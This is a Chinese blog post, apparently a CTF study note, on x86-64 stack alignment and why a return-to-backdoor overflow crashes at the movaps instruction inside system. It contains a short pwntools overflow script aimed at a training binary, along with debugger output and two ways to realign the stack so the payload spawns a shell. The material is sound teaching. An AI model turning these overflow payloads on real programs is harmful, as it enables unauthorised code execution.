@@ -1,0 +1,677 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="QYQS">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="本部分依然使用2024极客大挑战-你会栈溢出吗进行举例 先贴原理: 64位ubuntu18以上系统调用system函数时是需要栈对齐的。具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐 我们使用以下这个栈不平衡的脚本gdb的附加调试 12345678910from pwn import *context.log_level &#x3D; &#x27;debug&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈对齐">
+<meta property="og:url" content="http://example.com/2024/12/31/%E6%A0%88%E5%AF%B9%E9%BD%90/index.html">
+<meta property="og:site_name" content="QYQS">
+<meta property="og:description" content="本部分依然使用2024极客大挑战-你会栈溢出吗进行举例 先贴原理: 64位ubuntu18以上系统调用system函数时是需要栈对齐的。具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐 我们使用以下这个栈不平衡的脚本gdb的附加调试 12345678910from pwn import *context.log_level &#x3D; &#x27;debug&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412311906324.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412311912114.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412311916714.png">
+<meta property="article:published_time" content="2024-12-31T10:36:59.000Z">
+<meta property="article:modified_time" content="2024-12-31T11:53:10.220Z">
+<meta property="article:author" content="QYQS">
+<meta property="article:tag" content="基础知识">
+<meta property="article:tag" content="短文">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412311906324.png">
+  
+  
+  
+  <title>栈对齐 - QYQS</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>QYQS_blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="栈对齐"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-31 18:36" pubdate>
+          2024年12月31日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">栈对齐</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>本部分依然使用2024极客大挑战-你会栈溢出吗进行举例</strong></p>
+<p>先贴原理:</p>
+<p><strong>64位ubuntu18以上系统调用system函数时是需要栈对齐的</strong>。<strong>具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐</strong></p>
+<p>我们使用以下这个栈不平衡的脚本gdb的附加调试</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">a</span> = <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./stackover&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./stackover&#x27;</span>)<br><span class="hljs-comment">#a=remote(&quot;nc1.ctfplus.cn&quot;,46975)</span><br><span class="hljs-keyword">a</span>.recvline()<br>payload=b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">12</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x400728</span>)<br>gdb.attach(<span class="hljs-keyword">a</span>)<br><span class="hljs-keyword">a</span>.sendline(payload)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>我们来先查看栈视图</p>
+<p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412311906324.png" srcset="/img/loading.gif" lazyload alt="QQ_1735643007130"></p>
+<p>其实可以很明显的发现  栈地址都是以0或8结尾的</p>
+<p>实际上因为64位程序的地址是8字节的，而十六进制又是满16就会进位，因此我们看到的栈地址末尾要么是0要么是8。</p>
+<p>让我们一直运行下去直到报错</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> <span class="hljs-built_in">int</span>eractive<br></code></pre></td></tr></table></figure>
+
+<p>让我们来看看此时的调试情况</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs perl">[ Legend: Modified register | Code | Heap | Stack | String ]<br>───────────────────────────────────────────────────────────────── registers ────<br><span class="hljs-variable">$rax<span class="hljs-attr">   : 0x0000738f43c0ad58</span></span>  →  <span class="hljs-number">0x00007ffe8c4daef8</span>  →  <span class="hljs-number">0x00007ffe8c4dd212</span>  →  <span class="hljs-string">&quot;SHELL=/bin/bash&quot;</span><br><span class="hljs-variable">$rbx<span class="hljs-attr">   : 0x00007ffe8c4dac18</span></span>  →  <span class="hljs-number">0x000000000000000c</span> (<span class="hljs-string">&quot;</span><br><span class="hljs-string">                                                     &quot;</span>?)<br><span class="hljs-variable">$rcx<span class="hljs-attr">   : 0x00007ffe8c4dac18</span></span>  →  <span class="hljs-number">0x000000000000000c</span> (<span class="hljs-string">&quot;</span><br><span class="hljs-string">                                                     &quot;</span>?)<br><span class="hljs-variable">$rdx<span class="hljs-attr">   : 0x0</span></span>               <br><span class="hljs-variable">$rsp<span class="hljs-attr">   : 0x00007ffe8c4da9f8</span></span>  →  <span class="hljs-number">0x0000738f43db136e</span>  →  &lt;_dl_runtime_resolve_xsavec+007e&gt; mov r11, rax<br><span class="hljs-variable">$rbp<span class="hljs-attr">   : 0x00007ffe8c4daa78</span></span>  →  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-variable">$rsi<span class="hljs-attr">   : 0x0000738f43bcb42f</span></span>  →  <span class="hljs-number">0x0068732f6e69622f</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>?)<br><span class="hljs-variable">$rdi<span class="hljs-attr">   : 0x00007ffe8c4daa04</span></span>  →  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-variable">$rip<span class="hljs-attr">   : 0x0000738f43a5842b</span></span>  →  &lt;do_system+016b&gt; movaps XMMWORD PTR [rsp+<span class="hljs-number">0x50</span>], xmm0<br><span class="hljs-variable">$r8<span class="hljs-attr">    : 0x00007ffe8c4daa48</span></span>  →  <span class="hljs-number">0x00007ffe8c4daa98</span>  →  <span class="hljs-number">0x0000738f43dc9b35</span>  →  <span class="hljs-string">&quot;GLIBC_PRIVATE&quot;</span><br><span class="hljs-variable">$r9<span class="hljs-attr">    : 0x00007ffe8c4daef8</span></span>  →  <span class="hljs-number">0x00007ffe8c4dd212</span>  →  <span class="hljs-string">&quot;SHELL=/bin/bash&quot;</span><br><span class="hljs-variable">$r10<span class="hljs-attr">   : 0x8</span></span>               <br><span class="hljs-variable">$r11<span class="hljs-attr">   : 0x246</span></span>             <br><span class="hljs-variable">$r12<span class="hljs-attr">   : 0x000000000040086e</span></span>  →  <span class="hljs-number">0x0068732f6e69622f</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>?)<br><span class="hljs-variable">$r13<span class="hljs-attr">   : 0x0</span></span>               <br><span class="hljs-variable">$r14<span class="hljs-attr">   : 0x0</span></span>               <br><span class="hljs-variable">$r15<span class="hljs-attr">   : 0x0000738f43dd4000</span></span>  →  <span class="hljs-number">0x0000738f43dd52e0</span>  →  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-variable">$eflags</span>: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]<br><span class="hljs-variable">$cs</span>: <span class="hljs-number">0x33</span> <span class="hljs-variable">$ss</span>: <span class="hljs-number">0x2b</span> <span class="hljs-variable">$ds</span>: <span class="hljs-number">0x00</span> <span class="hljs-variable">$es</span>: <span class="hljs-number">0x00</span> <span class="hljs-variable">$fs</span>: <span class="hljs-number">0x00</span> <span class="hljs-variable">$gs</span>: <span class="hljs-number">0x00</span> <br>───────────────────────────────────────────────────────────────────── stack ────<br><span class="hljs-number">0x00007ffe8c4da9f8</span>│+<span class="hljs-number">0x0000</span>: <span class="hljs-number">0x0000738f43db136e</span>  →  &lt;_dl_runtime_resolve_xsavec+007e&gt; mov r11, rax	 ← <span class="hljs-variable">$rsp</span><br><span class="hljs-number">0x00007ffe8c4daa00</span>│+<span class="hljs-number">0x0008</span>: <span class="hljs-number">0x00000000ffffffff</span><br><span class="hljs-number">0x00007ffe8c4daa08</span>│+<span class="hljs-number">0x0010</span>: <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x00007ffe8c4daa10</span>│+<span class="hljs-number">0x0018</span>: <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x00007ffe8c4daa18</span>│+<span class="hljs-number">0x0020</span>: <span class="hljs-number">0x00007ffe8c4dabf8</span>  →  <span class="hljs-string">&quot;yes,yes,&quot;</span><br><span class="hljs-number">0x00007ffe8c4daa20</span>│+<span class="hljs-number">0x0028</span>: <span class="hljs-number">0x000000000040086e</span>  →  <span class="hljs-number">0x0068732f6e69622f</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>?)<br><span class="hljs-number">0x00007ffe8c4daa28</span>│+<span class="hljs-number">0x0030</span>: <span class="hljs-number">0x0000000000000025</span> (<span class="hljs-string">&quot;%&quot;</span>?)<br><span class="hljs-number">0x00007ffe8c4daa30</span>│+<span class="hljs-number">0x0038</span>: <span class="hljs-number">0x0000000000000000</span><br>─────────────────────────────────────────────────────────────── code:x86:<span class="hljs-number">64</span> ────<br>   <span class="hljs-number">0x738f43a58418</span> &lt;do_system+0158&gt; lea    rsi, [rip+<span class="hljs-number">0x173010</span>]        <span class="hljs-comment"># 0x738f43bcb42f</span><br>   <span class="hljs-number">0x738f43a5841f</span> &lt;do_system+015f&gt; mov    QWORD PTR [rsp+<span class="hljs-number">0x70</span>], <span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x738f43a58428</span> &lt;do_system+0168&gt; mov    r9, QWORD PTR [rax]<br> → <span class="hljs-number">0x738f43a5842b</span> &lt;do_system+016b&gt; movaps XMMWORD PTR [rsp+<span class="hljs-number">0x50</span>], xmm0<br>   <span class="hljs-number">0x738f43a58430</span> &lt;do_system+<span class="hljs-number">0170</span>&gt; call   <span class="hljs-number">0x738f43b0eca0</span> &lt;__GI___posix_spawn&gt;<br>   <span class="hljs-number">0x738f43a58435</span> &lt;do_system+<span class="hljs-number">0175</span>&gt; mov    rdi, rbx<br>   <span class="hljs-number">0x738f43a58438</span> &lt;do_system+0178&gt; mov    r12d, eax<br>   <span class="hljs-number">0x738f43a5843b</span> &lt;do_system+017b&gt; call   <span class="hljs-number">0x738f43b0f180</span> &lt;__posix_spawnattr_destroy&gt;<br>   <span class="hljs-number">0x738f43a58440</span> &lt;do_system+0180&gt; test   r12d, r12d<br>─────────────────────────────────────────────────────────────────── threads ────<br>[<span class="hljs-comment">#0] Id 1, Name: &quot;stackover&quot;, stopped 0x738f43a5842b in do_system (), reason: SIGSEGV</span><br>───────────────────────────────────────────────────────────────────── trace ────<br>[<span class="hljs-comment">#0] 0x738f43a5842b → do_system(line=0x40086e &quot;/bin/sh&quot;)</span><br>[<span class="hljs-comment">#1] 0x400749 → key()</span><br>[<span class="hljs-comment">#2] 0x7ffe8c4dae00 → add DWORD PTR [rax], eax</span><br>────────────────────────────────────────────────────────────────────────────────<br>gef➤  <br></code></pre></td></tr></table></figure>
+
+<p>正如文章开头提到的那样  程序被卡的原因是movaps指令要求的对齐</p>
+<p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412311912114.png" srcset="/img/loading.gif" lazyload alt="QQ_1735643527789"></p>
+<p>程序报错时正好卡在这里  没有问题</p>
+<p>刚刚我们提到过  64位程序地址是8字节的 所以栈地址要么是0 要么是8 既然我们需要16字节对齐  也就是在调用system时(其实是执行movaps时) rsp(观察参数)指向的地址应该是0结尾的</p>
+<p>那么查看此时的栈情况</p>
+<p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412311916714.png" srcset="/img/loading.gif" lazyload alt="QQ_1735643807270"></p>
+<p>此时rsp指向的栈地址并不是0结尾的 这也是为什么程序报错不能打开shell的原因</p>
+<p>那么想要解决这个问题  我们有很多办法</p>
+<p>对于这道题来说 我们只需要将返回地址+1即可</p>
+<p>为什么呢？</p>
+<p>看看key函数(本题的backdoor函数)的汇编</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400728</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400728</span>                               <span class="hljs-comment">; Attributes: bp-based frame</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400728</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400728</span>                               public key<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400728</span>                               key proc near<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400728</span>                               <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400728</span> <span class="hljs-number">55</span>                            <span class="hljs-keyword">push</span>    rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400729</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> E5                      <span class="hljs-keyword">mov</span>     rbp, rsp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040072</span>C <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">3</span>D <span class="hljs-number">15</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          lea     rdi, format                     <span class="hljs-comment">; &quot;yes,yes,this is key.you can catch me?&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400733</span> B8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                <span class="hljs-keyword">mov</span>     eax, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400738</span> E8 <span class="hljs-number">73</span> FE FF FF                <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400738</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040073</span>D <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">3</span>D <span class="hljs-number">2</span>A <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          lea     rdi, command                    <span class="hljs-comment">; &quot;/bin/sh&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400744</span> E8 <span class="hljs-number">57</span> FE FF FF                <span class="hljs-keyword">call</span>    _system<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400744</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400749</span> B8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                <span class="hljs-keyword">mov</span>     eax, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040074</span>E <span class="hljs-number">5</span>D                            <span class="hljs-keyword">pop</span>     rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040074</span>F C3                            retn<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040074</span>F                               <span class="hljs-comment">; &#125; // starts at 400728</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040074</span>F<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040074</span>F                               key endp<br></code></pre></td></tr></table></figure>
+
+<p>我们使用的未对齐的脚本返回地址指向的0x400728 也就是push指令  如果我们+1 即跳过push指令 由于栈地址只会是0or8 那么此时栈就对齐了 (8–&gt;0)</p>
+<p><strong>但是如果你最开始指向的地址就不是一个栈操作指令  加1也没用 请使用方法2</strong></p>
+<p>还有一种方法是构建一个rop链</p>
+<p>在返回地址之前加一个ret</p>
+<p>因为本来现在是没有对齐的，那我现在直接执行一条对栈操作指令（ret指令等同于pop rip，该指令使得rsp+8，从而完成rsp16字节对齐）</p>
+<p><strong>注:严格来说ret并不等同于pop rip 只是实现的效果类似与以下形式</strong></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"># <span class="hljs-keyword">call</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rip</span><br><span class="hljs-keyword">jmp</span> addr<br><br># <span class="hljs-keyword">ret</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rip</span><br>jump <span class="hljs-built_in">rip</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>注:</strong></p>
+<p>movaps<br>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary or a generalprotection exception (#GP) will be generated.<br>当源操作数或目标操作数是内存操作数时，操作数必须对齐到16字节（128位）将生成32字节（vexx .256编码版本）或64字节（EVEX.512编码版本）边界或通用保护异常（#GP）。<br>stack alignment<br>The processor does not check stack pointer alignment. It is the responsibility of the programs, tasks, and system procedures running on the processor to maintain proper alignment of stack pointers. Misaligning a stack pointer can cause serious performance degradation and in some instances program failures.<br>处理器不检查栈指针对齐。它是程序、任务和系统的责任在处理器上运行维护栈指针正确对齐的过程。栈指针对齐错误可能会导致严重的性能下降，在某些情况下还会导致程序失败。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="print-no-link">#基础知识</a>
+      
+        <a href="/tags/%E7%9F%AD%E6%96%87/" class="print-no-link">#短文</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>栈对齐</div>
+      <div>http://example.com/2024/12/31/栈对齐/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>QYQS</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/12/27/%E4%B8%A4%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8%E6%9D%82%E8%B0%88/" title="两进制入门杂谈">
+                        <span class="hidden-mobile">两进制入门杂谈</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
